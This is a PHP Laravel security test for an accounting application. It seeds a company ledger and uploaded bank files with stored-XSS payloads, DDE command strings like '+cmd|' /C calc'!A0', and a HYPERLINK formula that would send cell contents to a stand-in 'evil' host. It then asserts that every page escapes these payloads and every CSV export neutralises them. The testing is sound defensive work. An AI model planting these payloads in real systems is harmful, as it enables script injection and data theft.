<?php

namespace Tests\Feature\Security;

use App\Models\Shared\Party;
use App\Models\Team;
use App\Models\User;
use App\Support\Ledger\LedgerContext;
use Database\Seeders\TaxHolidaysSeeder;
use Database\Seeders\TaxModuleRulesSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Routing\Route as LaravelRoute;
use Illuminate\Support\Facades\Storage;
use Illuminate\Testing\TestResponse;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\Concerns\BuildsCompanyLedgers;
use Tests\Concerns\RunsRouteProbes;
use Tests\Concerns\SeedsSentinelLedgers;
use Tests\TestCase;

/**
 * R-44 security sweep, part 3: stored XSS and spreadsheet formula injection.
 *
 * A whole company ledger is seeded with a hostile string in EVERY free-text field the seeder fills (account, category,
 * party, description, memo, reference, preset, scenario, dimension, plan, tax correspondence, assistant question,
 * bank narrative, upload file name, company name, person name), plus bank files (CSV, OFX, QIF) whose narratives are
 * hostile. The owner then opens EVERY GET page of the application, and:
 *   - a text/html response must not contain the payload as live markup (it must be entity-escaped);
 *   - a non-HTML response (CSV, JSON, PDF) must never claim to be HTML;
 *   - every CSV export must start no cell with = + - @ tab or CR unless the cell is a plain number.
 * The sweep is non-vacuous: it also asserts the escaped payload really is on a good number of pages.
 */
class XssAndCsvSweepTest extends TestCase
{
    use BuildsCompanyLedgers;
    use RefreshDatabase;
    use RunsRouteProbes;
    use SeedsSentinelLedgers;

    /** Live markup that must never reach a page: each is what a browser would execute or act on. */
    private const LIVE = ['<svg/onload=alert(1)>', '<b onfocus=alert(2)', '<img src=x onerror=alert(3)>', '</script><script>alert(4)</script>', '<script>alert(5)</script>'];

    // short on purpose: the longest column the seeder fills with it is 60 characters wide, after a 16-character prefix
    private const LABEL = '<svg/onload=alert(1)>"><b onfocus=alert(2)';

    private User $me;

    private Team $company;

    private array $ids;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('local');
        $this->seed(TaxModuleRulesSeeder::class);
        $this->seed(TaxHolidaysSeeder::class);

        $this->me = $this->user();
        $this->me->forceFill(['name' => 'Eve <img src=x onerror=alert(3)>'])->save();
        $this->company = $this->company($this->me, 'Acme </script><script>alert(4)</script> <script>alert(5)</script>');
        $this->ids = $this->seedContext(self::LABEL, ['user_id' => null, 'team_id' => $this->company->id], company: $this->company);

        // Hostile text in the fields the seeder does not fill.
        $party = Party::query()->forContext(LedgerContext::company($this->company))->whereKey($this->ids['party'])->firstOrFail();
        $party->forceFill(['email' => 'a@example.com', 'notes' => '<script>alert(5)</script>', 'tax_number' => '<img src=x onerror=alert(3)>'])->save();
    }

    private function ids(LaravelRoute $route): array
    {
        $ids = $this->ids;
        $name = (string) $route->getName();
        if (str_starts_with($name, 'purchases.suppliers.')) {
            $ids['party'] = $ids['supplierParty'];
        }
        if (str_starts_with($name, 'purchases.receipts.')) {
            $ids['attachment'] = $ids['receiptAttachment'];
        }
        if (str_starts_with($name, 'reports.exports.')) {
            $ids['reportExport'] = $ids['doneExport'];
        }

        return $ids;
    }

    /** @return list<LaravelRoute> */
    private function getRoutes(): array
    {
        return array_values(array_filter($this->appRoutes(), fn (LaravelRoute $r) => in_array('GET', $r->methods(), true) && $r->getName() !== null
            && ! in_array($r->getName(), ['ecosystem.auth', 'sales.share.show', 'sales.share.pdf', 'attachments.show', 'reports.exports.download'], true)));
    }

    private function stageBankFiles(): void
    {
        $account = $this->ids['account'];
        $hostile = '<svg/onload=alert(1)>';
        $files = [
            'statement.csv' => "date,description,amount\n2026-10-03,=HYPERLINK(\"http://evil\") {$hostile},-10.00\n2026-10-04,@SUM(1+1) <img src=x onerror=alert(3)>,5.00\n",
            'statement.ofx' => "OFXHEADER:100\nDATA:OFXSGML\n\n<OFX><BANKMSGSRSV1><STMTTRNRS><STMTRS><CURDEF>ZAR<BANKTRANLIST><STMTTRN><TRNTYPE>DEBIT<DTPOSTED>20261005<TRNAMT>-12.00<FITID>1<NAME>{$hostile}<MEMO>+cmd|' /C calc'!A0 <b onfocus=alert(2) x=\"</STMTTRN></BANKTRANLIST></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>",
            'statement.qif' => "!Type:Bank\nD06/10/2026\nT-14.00\nP{$hostile}\nM-2+3 <img src=x onerror=alert(3)>\n^\n",
        ];
        $this->inCompany($this->me, $this->company);
        foreach ($files as $name => $content) {
            $response = $this->post(route('bank.import.upload'), ['account_id' => $account, 'file' => UploadedFile::fake()->createWithContent($name, $content)]);
            $response->assertRedirect();
            $preview = $response->headers->get('Location');
            $this->get($preview)->assertOk();
            $token = basename(parse_url($preview, PHP_URL_PATH));
            $this->post(route('bank.import.store', $token), ['date_format' => 'ymd', 'amount_locale' => 'en'])->assertRedirect();
        }
    }

    public function test_no_page_shows_a_stored_payload_as_live_markup(): void
    {
        $this->stageBankFiles();
        $escapedPages = 0;
        $visited = 0;
        $problems = [];

        foreach ($this->getRoutes() as $route) {
            $params = $this->paramsFor($route, $this->ids($route));
            if ($params === null) {
                continue;
            }
            $uri = route($route->getName(), $params, false);
            $response = $this->inCompany($this->me, $this->company)->get($uri);
            $visited++;

            if ($response->getStatusCode() >= 500) {
                $problems[] = "{$uri} answered ".$response->getStatusCode().' '.substr((string) $response->exception?->getMessage(), 0, 120);

                continue;
            }

            $type = (string) $response->headers->get('Content-Type');
            $body = $response instanceof TestResponse && method_exists($response->baseResponse, 'streamedContent') && $response->baseResponse instanceof StreamedResponse
                ? $response->streamedContent() : (string) $response->getContent();

            if (! str_contains($type, 'text/html')) {
                if (str_contains($body, '<svg/onload') && str_contains($type, 'html')) {
                    $problems[] = "{$uri} serves hostile text with an HTML content type";
                }

                continue;
            }

            foreach (self::LIVE as $live) {
                if (str_contains($body, $live)) {
                    $problems[] = "{$uri} contains live markup: {$live}";
                }
            }
            // A quote break-out of an attribute would leave the closing quote raw right before the tag.
            if (str_contains($body, '"><b onfocus=alert(2)')) {
                $problems[] = "{$uri} lets the payload break out of an attribute";
            }
            if (str_contains($body, '&lt;svg/onload=alert(1)&gt;') || str_contains($body, '&lt;img src=x onerror=alert(3)&gt;')) {
                $escapedPages++;
            }
        }

        $this->assertSame([], $problems, implode("\n", $problems));
        $this->assertGreaterThan(60, $visited, 'the sweep should visit most pages');
        $this->assertGreaterThan(25, $escapedPages, 'the payload must really be on many pages, escaped: otherwise the sweep proves nothing');
    }

    public function test_the_statement_lines_from_hostile_csv_ofx_and_qif_files_are_escaped_on_the_bank_pages(): void
    {
        $this->stageBankFiles();

        $html = $this->inCompany($this->me, $this->company)->get(route('bank.statements.index'))->assertOk()->getContent();
        $this->assertStringNotContainsString('<svg/onload=alert(1)>', $html);

        $statement = \DB::table('bank_statements')->where('team_id', $this->company->id)->orderByDesc('id')->value('id');
        $page = $this->get(route('bank.statements.show', $statement))->assertOk()->getContent();
        $this->assertStringNotContainsString('<svg/onload=alert(1)>', $page);
        $this->assertStringNotContainsString('<img src=x onerror=alert(3)>', $page);
        $this->assertStringContainsString('&lt;svg/onload=alert(1)&gt;', $page);
    }

    /** @return array<string, array{0: string, 1: array}> every CSV a person can download, as (route name, parameters) */
    private function csvRoutes(): array
    {
        $names = ['bank.reconciliation.csv', 'sales.customers.statement.csv', 'sales.receivables.csv', 'purchases.suppliers.statement', 'purchases.ap.index', 'tax.returns.csv', 'tax.income.csv', 'controls.access-review.export', 'purchases.runs.csv'];

        return array_combine($names, array_map(fn ($n) => [$n], $names));
    }

    private function cells(string $csv): array
    {
        $out = [];
        foreach (preg_split('/\R/', $csv) as $line) {
            if ($line === '') {
                continue;
            }
            foreach (str_getcsv($line, ',', '"', '') as $cell) {
                $out[] = (string) $cell;
            }
        }

        return $out;
    }

    private function assertFormulaSafe(string $csv, string $where): void
    {
        $this->assertNotSame('', trim($csv), $where.' produced nothing');
        foreach ($this->cells($csv) as $cell) {
            if ($cell === '' || is_numeric($cell)) {
                continue;
            }
            $this->assertDoesNotMatchRegularExpression('/^[=+\-@\t\r]/', $cell, "{$where}: a cell would run as a formula: {$cell}");
        }
    }

    public function test_every_csv_export_neutralises_a_hostile_cell(): void
    {
        $hostile = '=HYPERLINK("http://evil/?x="&A1,"click")';
        $ctx = LedgerContext::company($this->company);
        // Make the most-exported text fields hostile: party names, references, descriptions, rule/preset names.
        \DB::table('parties')->where('team_id', $this->company->id)->update(['name' => $hostile]);
        \DB::table('transactions')->where('team_id', $this->company->id)->update(['description' => '+cmd|\' /C calc\'!A0']);
        \DB::table('sales_documents')->where('team_id', $this->company->id)->where('status', 'draft')->update(['reference' => $hostile]);
        \DB::table('bills')->where('team_id', $this->company->id)->update(['supplier_reference' => $hostile]);
        \DB::table('users')->where('id', $this->me->id)->update(['name' => $hostile]);
        $this->assertNotNull($ctx);
        $this->stageBankFiles();   // statement narratives that start with = + - @ ("=HYPERLINK(...)", "+cmd|...", "-2+3") reach the reconciliation exports

        $this->inCompany($this->me, $this->company);
        $checked = [];
        foreach ($this->getRoutes() as $route) {
            $name = $route->getName();
            if (! (str_ends_with($route->uri(), '.csv') || str_contains($name, 'csv') || str_contains($name, 'export') || str_contains($route->uri(), 'statement'))) {
                continue;
            }
            $params = $this->paramsFor($route, $this->ids($route));
            if ($params === null) {
                continue;
            }
            $query = in_array($name, ['purchases.suppliers.statement'], true) ? '?format=csv' : '';
            $response = $this->inCompany($this->me, $this->company)->get(route($name, $params, false).$query);
            $type = (string) $response->headers->get('Content-Type');
            if (! str_contains($type, 'csv')) {
                continue;
            }
            $body = $response->baseResponse instanceof StreamedResponse ? $response->streamedContent() : (string) $response->getContent();
            $this->assertFormulaSafe($body, $name);
            $checked[] = $name;
        }

        $this->assertGreaterThanOrEqual(5, count($checked), 'expected several CSV downloads, got: '.implode(', ', $checked));
    }

    public function test_the_supplier_statement_csv_neutralises_a_hostile_supplier_name_and_reference(): void
    {
        \DB::table('parties')->where('id', $this->ids['supplierParty'])->update(['name' => '=cmd|\'/C calc\'!A0']);

        $csv = $this->inCompany($this->me, $this->company)
            ->get(route('purchases.suppliers.statement', ['party' => $this->ids['supplierParty'], 'format' => 'csv']))->assertOk()->streamedContent();

        $this->assertStringContainsString("'=cmd", $csv);
        $this->assertFormulaSafe($csv, 'supplier statement');
    }
}
